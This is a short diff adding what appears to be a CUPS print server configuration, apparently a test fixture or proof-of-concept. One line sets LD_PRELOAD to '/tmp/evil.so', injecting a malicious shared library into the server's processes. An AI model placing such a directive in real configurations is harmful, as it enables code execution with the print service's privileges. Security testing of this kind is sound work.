@@ -1,0 +1,9 @@
+LogLevel warn
+Listen localhost:631
+PassEnv abé
+SetEnv LD_PRELOAD /tmp/evil.so
+<Location /admin>
+  Order deny,allow
+  Allow from @IF(lo)
+  Require user @SYSTEM
+</Location>
